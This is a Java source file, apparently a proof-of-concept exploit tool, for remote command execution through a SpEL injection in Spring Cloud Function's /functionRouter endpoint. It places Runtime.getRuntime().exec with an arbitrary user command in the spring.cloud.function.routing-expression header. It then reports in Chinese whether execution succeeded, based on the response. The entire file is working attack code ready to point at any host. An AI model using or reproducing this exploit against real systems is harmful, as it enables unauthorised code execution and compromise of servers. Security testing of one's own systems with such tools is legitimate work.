package org.example.Poc;

import cn.hutool.core.util.StrUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import cn.hutool.http.HttpUtil;

import java.util.Map;

public class Function {
    public String Command (String host, String usercmd, String randomMD5) {

        String url = host + "/functionRouter";
        String payload = null;
        if (randomMD5 == null) {
            payload = "T(java.lang.Runtime).getRuntime().exec(\"{}\")";
            payload = StrUtil.format(payload,usercmd);
        }else {
            payload = usercmd;
        }


        try {
            HttpResponse res =  HttpRequest.post(url)
    //                .setHttpProxy("127.0.0.1",8080)
                    //移除自带的header请求头Accept
                    .header("Accept", "")
                    .header("spring.cloud.function.routing-expression",payload)
                    .body(randomMD5)
                    .timeout(60000)//超时，毫秒
                    .execute();

            String regex = "^(?=.*timestamp)(?=.*path)(?=.*status)(?=.*error)(?=.*requestId).*";
            boolean isMatch = res.body().matches(regex);
    //        System.out.println(isMatch);

            if (res.getStatus() == 500&&isMatch) {
                return "[+]无回显，通过Response判断命令执行成功\nResponse:\n" + res.body();

            } else if (res.getStatus() == 200&&res.body().contains(randomMD5.toUpperCase())) {
                return res.body();

            } else {

                return "[-]无回显，通过Response判断命令执行失败\nResponse:\n" + res.body();

            }
        } catch (Exception e) {
            return "请求失败！";
        }
    }
}
